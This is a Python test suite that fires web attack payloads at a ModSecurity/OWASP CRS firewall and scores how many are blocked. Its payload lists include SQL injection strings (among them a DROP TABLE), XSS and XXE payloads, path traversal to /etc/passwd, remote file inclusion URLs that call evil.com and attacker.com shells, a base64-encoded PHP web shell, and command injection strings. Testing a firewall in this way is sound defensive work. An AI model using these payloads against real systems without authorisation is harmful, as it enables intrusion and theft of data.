#!/usr/bin/env python3
"""
ModSecurity OWASP CRS Test Suite
Tests various attack vectors against ModSecurity with OWASP Core Rule Set
"""

import requests
import json
import time
import sys
from urllib.parse import quote
import argparse

class ModSecurityTester:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.results = {
            'blocked': [],
            'allowed': [],
            'errors': []
        }
        
    def test_payload(self, test_name, method='GET', path='/', headers=None, data=None, params=None):
        """Test a single payload against ModSecurity"""
        url = f"{self.target_url}{path}"
        
        default_headers = {
            'User-Agent': 'ModSecurity-Test-Suite/1.0',
            'Accept': '*/*'
        }
        
        if headers:
            default_headers.update(headers)
            
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, headers=default_headers, 
                                          timeout=self.timeout, allow_redirects=False)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, headers=default_headers,
                                           timeout=self.timeout, allow_redirects=False)
            elif method.upper() == 'PUT':
                response = self.session.put(url, data=data, headers=default_headers,
                                          timeout=self.timeout, allow_redirects=False)
            
            # ModSecurity typically blocks with 403 or 406 status codes
            if response.status_code in [403, 406, 501, 502, 503]:
                self.results['blocked'].append({
                    'test': test_name,
                    'status': response.status_code,
                    'method': method,
                    'blocked': True
                })
                print(f"✅ BLOCKED: {test_name} (HTTP {response.status_code})")
                return True
            else:
                self.results['allowed'].append({
                    'test': test_name,
                    'status': response.status_code,
                    'method': method,
                    'blocked': False
                })
                print(f"⚠️  ALLOWED: {test_name} (HTTP {response.status_code})")
                return False
                
        except requests.RequestException as e:
            self.results['errors'].append({
                'test': test_name,
                'error': str(e),
                'method': method
            })
            print(f"❌ ERROR: {test_name} - {str(e)}")
            return None
    
    def run_sql_injection_tests(self):
        """Test SQL Injection attack vectors (CRS Rule Series 942xxx)"""
        print("\n📋 Testing SQL Injection attacks (Rule Series 942xxx)...")
        print("-" * 60)
        
        sql_payloads = [
            # Basic SQL injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "admin'/*",
            
            # Union-based SQL injection
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            
            # Boolean-based blind SQL injection
            "' AND 1=1--",
            "' AND 1=2--",
            
            # Time-based blind SQL injection
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--",
            "'; SELECT pg_sleep(5)--",
            
            # Error-based SQL injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            
            # Second-order SQL injection
            "admin'; DROP TABLE users;--",
            "'; INSERT INTO users VALUES ('hacker','password');--"
        ]
        
        for payload in sql_payloads:
            # Test in URL parameters
            self.test_payload(f"SQL Injection (GET param): {payload[:30]}...", 
                            method='GET', path='/', params={'id': payload})
            
            # Test in POST data
            self.test_payload(f"SQL Injection (POST data): {payload[:30]}...", 
                            method='POST', path='/', data={'username': payload, 'password': 'test'})
            
            time.sleep(0.1)  # Rate limiting
    
    def run_xss_tests(self):
        """Test Cross-Site Scripting attack vectors (CRS Rule Series 941xxx)"""
        print("\n📋 Testing XSS attacks (Rule Series 941xxx)...")
        print("-" * 60)
        
        xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Event handler XSS
            "<input type='text' onmouseover='alert(1)'>",
            "<body onload=alert('XSS')>",
            "<div onclick='alert(1)'>Click me</div>",
            
            # JavaScript URI
            "javascript:alert('XSS')",
            "javascript:void(0)",
            
            # Encoded XSS
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;",
            
            # Filter bypass attempts
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            
            # CSS-based XSS
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            
            # DOM-based XSS vectors
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<object data='javascript:alert(\"XSS\")'></object>"
        ]
        
        for payload in xss_payloads:
            # Test in URL parameters
            self.test_payload(f"XSS (GET param): {payload[:30]}...", 
                            method='GET', path='/', params={'q': payload})
            
            # Test in POST data
            self.test_payload(f"XSS (POST data): {payload[:30]}...", 
                            method='POST', path='/', data={'comment': payload})
            
            time.sleep(0.1)
    
    def run_lfi_tests(self):
        """Test Local File Inclusion attacks (CRS Rule Series 930xxx)"""
        print("\n📋 Testing Local File Inclusion attacks (Rule Series 930xxx)...")
        print("-" * 60)
        
        lfi_payloads = [
            # Basic LFI
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            
            # Null byte injection (historical)
            "../../../etc/passwd%00.jpg",
            
            # URL encoding
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
            
            # Double encoding
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%65%74%63%2f%70%61%73%73%77%64",
            
            # Filter bypass
            "....//....//....//etc/passwd",
            "..///////..////..//////etc/passwd",
            
            # Proc filesystem
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
            
            # Log files
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log"
        ]
        
        for payload in lfi_payloads:
            self.test_payload(f"LFI: {payload[:30]}...", 
                            method='GET', path='/', params={'file': payload})
            time.sleep(0.1)
    
    def run_rfi_tests(self):
        """Test Remote File Inclusion attacks (CRS Rule Series 931xxx)"""
        print("\n📋 Testing Remote File Inclusion attacks (Rule Series 931xxx)...")
        print("-" * 60)
        
        rfi_payloads = [
            # Basic RFI
            "http://evil.com/shell.php",
            "https://attacker.com/backdoor.txt",
            
            # With query parameters
            "http://evil.com/shell.php?cmd=id",
            
            # FTP protocol
            "ftp://evil.com/shell.php",
            
            # Data URIs
            "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
            
            # PHP wrappers
            "php://input",
            "php://filter/convert.base64-encode/resource=index.php",
            "expect://whoami"
        ]
        
        for payload in rfi_payloads:
            self.test_payload(f"RFI: {payload[:30]}...", 
                            method='GET', path='/', params={'include': payload})
            time.sleep(0.1)
    
    def run_command_injection_tests(self):
        """Test Command Injection attacks (CRS Rule Series 932xxx)"""
        print("\n📋 Testing Command Injection attacks (Rule Series 932xxx)...")
        print("-" * 60)
        
        cmd_payloads = [
            # Basic command injection
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "|| id",
            
            # Windows commands
            "& dir",
            "&& type C:\\windows\\system32\\drivers\\etc\\hosts",
            
            # Backticks
            "`whoami`",
            "`cat /etc/passwd`",
            
            # Command substitution
            "$(whoami)",
            "$(cat /etc/passwd)",
            
            # Time-based detection
            "; sleep 10",
            "| ping -c 10 127.0.0.1"
        ]
        
        for payload in cmd_payloads:
            self.test_payload(f"Command Injection: {payload[:30]}...", 
                            method='GET', path='/', params={'cmd': payload})
            
            self.test_payload(f"Command Injection (POST): {payload[:30]}...", 
                            method='POST', path='/', data={'command': payload})
            time.sleep(0.1)
    
    def run_protocol_attacks(self):
        """Test Protocol-level attacks (CRS Rule Series 920xxx, 921xxx)"""
        print("\n📋 Testing Protocol attacks (Rule Series 920xxx, 921xxx)...")
        print("-" * 60)
        
        # Header injection
        self.test_payload("Header Injection (CRLF)", method='GET', path='/', 
                         headers={'X-Custom': 'test\r\nInjected: header'})
        
        # HTTP Request Smuggling
        self.test_payload("HTTP Request Smuggling", method='POST', path='/', 
                         headers={'Transfer-Encoding': 'chunked', 'Content-Length': '10'})
        
        # Oversized headers
        self.test_payload("Oversized Header", method='GET', path='/', 
                         headers={'X-Large': 'A' * 8192})
        
        # Invalid characters in headers
        self.test_payload("Invalid Header Characters", method='GET', path='/', 
                         headers={'X-Invalid': 'test\x00\x01\x02'})
        
        # Method override
        self.test_payload("Method Override", method='POST', path='/', 
                         headers={'X-HTTP-Method-Override': 'DELETE'})
    
    def run_session_attacks(self):
        """Test Session-related attacks (CRS Rule Series 943xxx)"""
        print("\n📋 Testing Session attacks (Rule Series 943xxx)...")
        print("-" * 60)
        
        # Session fixation
        self.test_payload("Session Fixation", method='GET', path='/', 
                         params={'PHPSESSID': 'fixed_session_id'})
        
        # Cookie injection
        self.test_payload("Cookie Injection", method='GET', path='/', 
                         headers={'Cookie': 'admin=true; role=administrator'})
    
    def run_application_attacks(self):
        """Test Application-specific attacks"""
        print("\n📋 Testing Application-specific attacks...")
        print("-" * 60)
        
        # XXE (XML External Entity)
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>'''
        
        self.test_payload("XXE Attack", method='POST', path='/', 
                         data=xxe_payload, headers={'Content-Type': 'application/xml'})
        
        # JSON injection
        json_payload = '{"username": "admin", "password": "password", "role": "administrator"}'
        self.test_payload("JSON Injection", method='POST', path='/', 
                         data=json_payload, headers={'Content-Type': 'application/json'})
        
        # LDAP injection
        ldap_payloads = ["*", "*(objectClass=*)", "admin)(&(password=*))"]
        for payload in ldap_payloads:
            self.test_payload(f"LDAP Injection: {payload}", method='GET', path='/', 
                             params={'user': payload})
    
    def run_scanner_detection_tests(self):
        """Test Scanner/Bot detection (CRS Rule Series 913xxx)"""
        print("\n📋 Testing Scanner detection (Rule Series 913xxx)...")
        print("-" * 60)
        
        # Known scanner user agents
        scanner_agents = [
            "sqlmap/1.0",
            "Nessus",
            "OpenVAS", 
            "Nikto",
            "w3af",
            "Burp Suite",
            "OWASP ZAP"
        ]
        
        for agent in scanner_agents:
            self.test_payload(f"Scanner UA: {agent}", method='GET', path='/', 
                             headers={'User-Agent': agent})
    
    def run_php_attacks(self):
        """Test PHP-specific attacks (CRS Rule Series 933xxx)"""
        print("\n📋 Testing PHP attacks (Rule Series 933xxx)...")
        print("-" * 60)
        
        php_payloads = [
            "<?php system($_GET['cmd']); ?>",
            "<?php phpinfo(); ?>",
            "<?php eval($_POST['code']); ?>",
            "<?php file_get_contents('/etc/passwd'); ?>",
            "<?php exec('whoami'); ?>"
        ]
        
        for payload in php_payloads:
            self.test_payload(f"PHP Injection: {payload[:30]}...", 
                            method='POST', path='/', data={'code': payload})
            time.sleep(0.1)
    
    def run_java_attacks(self):
        """Test Java-specific attacks (CRS Rule Series 944xxx)"""
        print("\n📋 Testing Java attacks (Rule Series 944xxx)...")
        print("-" * 60)
        
        java_payloads = [
            "java.lang.Runtime.getRuntime().exec('whoami')",
            "java.io.FileInputStream",
            "java.lang.ProcessBuilder",
            "ObjectInputStream",
            "readObject()"
        ]
        
        for payload in java_payloads:
            self.test_payload(f"Java Attack: {payload[:30]}...", 
                            method='POST', path='/', data={'data': payload})
            time.sleep(0.1)
    
    def run_all_tests(self):
        """Run all test suites"""
        print(f"🚀 Starting ModSecurity test suite against {self.target_url}")
        print("=" * 80)
        
        test_suites = [
            self.run_sql_injection_tests,
            self.run_xss_tests,
            self.run_lfi_tests,
            self.run_rfi_tests,
            self.run_command_injection_tests,
            self.run_protocol_attacks,
            self.run_session_attacks,
            self.run_application_attacks,
            self.run_scanner_detection_tests,
            self.run_php_attacks,
            self.run_java_attacks
        ]
        
        for test_suite in test_suites:
            test_suite()
            time.sleep(1)  # Pause between test suites
        
        self.print_results()
    
    def print_results(self):
        """Print test results summary"""
        print("\n" + "=" * 80)
        print("🔍 TEST RESULTS SUMMARY")
        print("=" * 80)
        
        total_tests = len(self.results['blocked']) + len(self.results['allowed']) + len(self.results['errors'])
        blocked_count = len(self.results['blocked'])
        allowed_count = len(self.results['allowed'])
        error_count = len(self.results['errors'])
        
        print(f"📊 Total Tests: {total_tests}")
        print(f"✅ Blocked (Protected): {blocked_count}")
        print(f"⚠️  Allowed (Potential Risk): {allowed_count}")
        print(f"❌ Errors: {error_count}")
        
        if total_tests > 0:
            protection_rate = (blocked_count / (blocked_count + allowed_count)) * 100 if (blocked_count + allowed_count) > 0 else 0
            print(f"🛡️  Protection Rate: {protection_rate:.1f}%")
        
        print(f"\n📋 Analysis:")
        if protection_rate >= 80:
            print("🟢 EXCELLENT: Your ModSecurity setup is providing strong protection!")
        elif protection_rate >= 60:
            print("🟡 GOOD: Your ModSecurity setup is providing decent protection, consider tuning.")
        else:
            print("🔴 NEEDS IMPROVEMENT: Your ModSecurity setup may need configuration review.")
    
    def save_detailed_report(self, filename='modsecurity_test_report.json'):
        """Save detailed results to JSON file"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n📄 Detailed report saved to: {filename}")

# Test categories that ModSecurity CRS can handle
MODSECURITY_TEST_CATEGORIES = {
    "SQL Injection (942xxx)": {
        "description": "Tests for SQL injection vulnerabilities",
        "owasp_top10": "A03:2021 - Injection",
        "expected_protection": "High (90-100%)",
        "rules": "942xxx series - SQL injection detection"
    },
    "Cross-Site Scripting/XSS (941xxx)": {
        "description": "Tests for XSS vulnerabilities",
        "owasp_top10": "A03:2021 - Injection", 
        "expected_protection": "High (80-95%)",
        "rules": "941xxx series - XSS detection"
    },
    "Local File Inclusion/LFI (930xxx)": {
        "description": "Tests for local file inclusion",
        "owasp_top10": "A06:2021 - Vulnerable Components",
        "expected_protection": "High (85-100%)",
        "rules": "930xxx series - LFI/path traversal detection"
    },
    "Remote File Inclusion/RFI (931xxx)": {
        "description": "Tests for remote file inclusion",
        "owasp_top10": "A06:2021 - Vulnerable Components",
        "expected_protection": "Medium (60-80%)",
        "rules": "931xxx series - RFI detection"
    },
    "Command Injection (932xxx)": {
        "description": "Tests for OS command injection",
        "owasp_top10": "A03:2021 - Injection",
        "expected_protection": "High (80-95%)",
        "rules": "932xxx series - Remote code execution detection"
    },
    "Protocol Attacks (920xxx/921xxx)": {
        "description": "HTTP protocol violations and attacks",
        "owasp_top10": "A05:2021 - Security Misconfiguration",
        "expected_protection": "High (90-100%)",
        "rules": "920xxx protocol enforcement, 921xxx protocol attacks"
    },
    "Session Attacks (943xxx)": {
        "description": "Session fixation and manipulation",
        "owasp_top10": "A07:2021 - Authentication Failures",
        "expected_protection": "Medium (40-70%)",
        "rules": "943xxx series - Session fixation detection"
    },
    "Scanner Detection (913xxx)": {
        "description": "Detection of security scanners and bots",
        "owasp_top10": "General Protection",
        "expected_protection": "High (85-100%)",
        "rules": "913xxx series - Scanner/bot detection"
    },
    "PHP Injection (933xxx)": {
        "description": "PHP-specific injection attacks",
        "owasp_top10": "A03:2021 - Injection",
        "expected_protection": "High (85-95%)",
        "rules": "933xxx series - PHP injection detection"
    },
    "Java Attacks (944xxx)": {
        "description": "Java deserialization and injection",
        "owasp_top10": "A08:2021 - Software Integrity Failures",
        "expected_protection": "Medium (70-85%)",
        "rules": "944xxx series - Java attack detection"
    }
}

def print_test_categories():
    """Print all test categories that ModSecurity can handle"""
    print("🔒 MODSECURITY CRS TEST CATEGORIES")
    print("=" * 80)
    
    for category, details in MODSECURITY_TEST_CATEGORIES.items():
        print(f"\n📋 {category}")
        print(f"   📝 Description: {details['description']}")
        print(f"   🎯 OWASP Top 10: {details['owasp_top10']}")
        print(f"   🛡️  Expected Protection: {details['expected_protection']}")
        print(f"   ⚙️  Rule Series: {details['rules']}")

def main():
    parser = argparse.ArgumentParser(description='ModSecurity OWASP CRS Test Suite')
    parser.add_argument('url', nargs='?', help='Target URL to test (e.g., http://localhost)')
    parser.add_argument('--categories-only', action='store_true', 
                       help='Only show test categories without running tests')
    parser.add_argument('--timeout', type=int, default=10, 
                       help='Request timeout in seconds (default: 10)')
    
    args = parser.parse_args()
    
    if args.categories_only or not args.url:
        print_test_categories()
        if not args.url:
            print("\n" + "="*80)
            print("🚀 To run tests, provide a target URL:")
            print("   python test_modsecurity.py http://your-server.com")
        return
    
    print_test_categories()
    print("\n")
    
    # Run the tests
    tester = ModSecurityTester(args.url, timeout=args.timeout)
    tester.run_all_tests()
    tester.save_detailed_report()

if __name__ == "__main__":
    main() 